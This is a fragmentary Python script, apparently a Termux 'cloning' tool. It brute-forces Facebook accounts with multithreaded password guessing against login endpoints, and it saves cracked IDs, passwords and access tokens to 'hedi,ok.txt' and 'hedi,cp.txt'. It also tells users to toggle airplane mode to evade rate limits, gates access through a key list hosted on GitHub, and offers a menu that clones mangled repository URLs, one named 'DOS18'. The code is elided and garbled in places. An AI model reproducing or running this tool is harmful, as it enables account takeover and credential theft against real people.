...
def reg():
    ...
    time.sleep(1)
    try:
        to = open("/sdcard/.zf.p.txt", "r").read()
    except (KeyError , IOError):
        reg2()
    r = requests.get("https://raw.githubusercontent.com/Tech-ZulfiQar-MaGsi/Newcloning/main/server.txt").text
    if to in r:
        os.system('clear')
        print(logo)
        print("")
        ...
        os.system("xdg-open https://wa.me/+23340002925")
        reg()
def reg2():
    os.system("clear")
    print(logo)
    ...
    s = open('/sdcard/.zf.p.txt', 'w')
    s.write(id)
    s.close()
    ids = open('/sdcard/.zf.p.txt', 'r').read()
    print(" Your key: "+ids)
    print("")
    print("")
    raw_input(" Press enter to go to whatsapp ")
    os.system("xdg-open https://wa.me/+9203340002925")
...
def cek_token(token):
	...
	if _id == "0" or "0" == _id:
		...
		jalan(p+ " ["+k+"✓"+p+"]"+k+" Token Free Save to: Abdullahtoken.txt"+p)
		run_indo()
	...
	if profers in [""]:
		...
		if bukanmaen in ["m","M"]:
			with ThreadPoolExecutor(max_workers=30) as coeg:
				asu = raw_input("%s [%s•%s] Example password: pakistan, 786786, First Last\n %s[%s•%s] Pass list: "%(p,k,p,p,k,p)).split(",")
				if len(asu) =="":
					exit("%s [%s!%s] Unknown!"%(p,m,p))
				print("\n%s [%s•%s] Result OK saved to : hedi,ok.txt\n %s[%s•%s] Result CP saved to : hedi,cp.txt"%(p,k,p,p,k,p))
		...
		if bukanmaen in ["m","M"]:
			with ThreadPoolExecutor(max_workers=30) as coeg:
				asu = raw_input("%s [%s•%s] Example password: Pakistan, First Last,786786\n %s[%s•%s] Pass list: "%(p,k,p,p,k,p)).split(",")
				if len(asu) =="":
					exit("%s [%s!%s] Unknown!"%(p,m,p))
				print("\n%s [%s•%s] Result OK saved to : hedi,ok.txt\n %s[%s•%s] Result CP saved to : hedi,.txt"%(p,k,p,p,k,p))
				print("%s [%s•%s] turn on mode airplane (5 sec)"%(p,k,p))
				print("%s [%s•%s] reset APN connections (5 sec)\n"%(p,k,p))
				#fak
				for user in id:
			...
			with ThreadPoolExecutor(max_workers=35) as coeg:
				...
				for user in id:
					...
					if len(frist)>=6:
						...
						pwcuk = [ "sayang", "bismillah", "anjing", "bangsat", "freefire", "katasandi", "nigeria", "sayangkamu", "doraemon", "merdeka", "sepeda", "kontol", "jembut", "legend", "kuontol", "password", "samsung", "xiaomi", "kacang", "kelinci", "youtube", "facebook" ]
		...
		if bukanmaen in ["m","M"]:
			with ThreadPoolExecutor(max_workers=30) as coeg:
				asu = raw_input("%s [%s•%s] Example password: Pakistan,First Last,First123\n %s[%s•%s] Pass list: "%(p,k,p,p,k,p)).split(",")
				if len(asu) =="":
					exit("%s [%s!%s] Unknown!"%(p,m,p))
				print("\n%s [%s•%s] Result OK saved to : hedi,ok.txt\n %s[%s•%s] Result CP saved to : hedi,cp.txt"%(p,k,p,p,k,p))
				print("%s [%s•%s] turn on mode airplane (5 sec)"%(p,k,p))
...
def api(uid, pwcuk):
	...
	sys.stdout.write(
		"\r [HEDI] %s/%s OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwcuk:
		pw = pw.lower()
		...
		if "session_key" in send.text and "EAAA" in send.text:
			print("\r \x1b[1;32m[HEDI-OK] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s | %s"%(uid, pw))
			open("hedi,ok.txt","a").write("%s | %s\n"%(uid, pw))
			break
			...
			try:
				...
				with requests.Session() as ses:
					...
					month = bulan_ttl[month]
					print("\r\x1b[1;33m [HEDI-CP] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s | %s"%(uid, pw))
					open("hedi,cp.txt","a").write("%s | %s | %s\n"%(uid, pw, ttl))
					open("hedi,cp.txt","a").write("%s | %s | %s\n"%(uid, pw, ttl))
					break
			except (KeyError, IOError):
				day = (" ")
			...
			print("\r\x1b[1;33m [HEDI-CP] %s • %s\033[0;97m        "%(uid, pw))
			cp.append("%s | %s"%(uid, pw))
			open("hedi,cp.txt","a").write("%s | %s\n"%(uid, pw))
			open("hedi,cp.txt","a").write("%s | %s\n"%(uid, pw))
			break
		else:
			continue
...
def mbasic(uid, pwcuk):
	...
	sys.stdout.write(
		"\r %s[HEDI] %s/%s OK:-%s - CP:-%s "%(rm,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwcuk:
		kwargs = {}
		pw = pw.lower()
...
#bersih()
 ...
 speed("\n \033[1;36m╔══════════════════════════════╗")
 speed(" ╠═\033[1;91m▶ \033[1;33m1. Not Vaiable")
 speed(" \033[1;36m╚══════════════════════════════╝")

 speed(" ╔══════════════════════════════╗")
 speed(" ╠═\033[1;91m▶ \033[1;33m2. Not Aviable")
 speed(" \033[1;36m╚══════════════════════════════╝")

 speed(" ╔══════════════════════════════╗")
 speed(" ╠═\033[1;91m▶ \033[1;33m3. Not Aviable")
 speed(" \033[1;36m╚══════════════════════════════╝")

 speed(" \033[1;36m╔══════════════════════════════╗")
 speed(" ╠═\033[1;91m▶ \033[1;33m4. Not Aviable")
 speed(" \033[1;36m╚══════════════════════════════╝")

 speed(" ╔══════════════════════════════╗")
 speed(" ╠═\033[1;91m▶ \033[1;33m5. Not Available")
 speed(" \033[1;36m╚══════════════════════════════╝")

 speed(" ╔══════════════════════════════╗")
 speed(" ╠═\033[1;91m▶ \033[1;33m6. Not Aviable")
 speed(" \033[1;36m╚══════════════════════════════╝")

 speed(" ╔══════════════════════════════╗")
 speed(" ╠═\033[1;91m▶ \033[1;33m7. Not Available")
 speed(" \033[1;36m╚══════════════════════════════╝")

 speed(" ╔══════════════════════════════╗")
 speed(" ╠═\033[1;91m▶ \033[1;33m8. Not Available")
 speed(" \033[1;36m╚══════════════════════════════╝")

 speed(" \033[1;36m╔══════════════════════════════╗")
 speed(" ╠═\033[1;91m▶ \033[1;33m9. Not Available")
 speed(" \033[1;36m╚══════════════════════════════╝")
 ...
 if pil =="1":
   ...
   os.system("git clone hps://ghub.com/Pof/premum")
   os.system("Not Available") 
 #2if
 elif pil =="2":
   time.sleep(1.5)
   os.system("cd /data/data/com.termux/files/home")
   os.system("Not Available")
   os.system("git clone https://githu/KangProRubFB")
   os.system("Not Available")
 #3if
 elif pil =="3":
   time.sleep(1.5)
   os.system("cd /data/data/com.mux/files/home")
   os.system("git clone https://githcom/KangProf/freesms")
   os.system("Not Available")
 ...
 #4if
   ...
   os.system("git clone https://giom/KangProf/DOS18") 
   os.system("Not Available")
 #5if
 elif pil =="5":
   os.system("cd /data/data/com.termux/files/home")
   os.system("git clone https://githom/KgProf/KiriKanan")
   os.system("Not Available")
 #6if
 elif pil =="6":
   os.system("cd /data/data/com.termux/files/home")
   os.system("Not Available")
   os.system("git clone https://githucom/KangPf/informasi")
   os.system("Not Available")
 #7if
 elif pil =="7":
   run_indo()
   os.system("cd /data/data/com.termux/files/home")
   os.system("git clone https://githubom/KgProf/BEBAN")
   os.system("Not Available")
 #8if
 elif pil =="8":
   run_indo()
   os.system("cd /data/data/com.termux/files/home")
   os.system("Not Available")
   os.system("git clone https://githubgProf/Obfuscate")
   os.system("Not Available")
 #9if
 elif pil =="9":
   mengetik("Folow me on my github Thx Brother...see you :)")
   os.system("xdg-open https://github.com/HackedDok")
   time.sleep(3)
   menu()   
 elif pil =="0":
   menu()
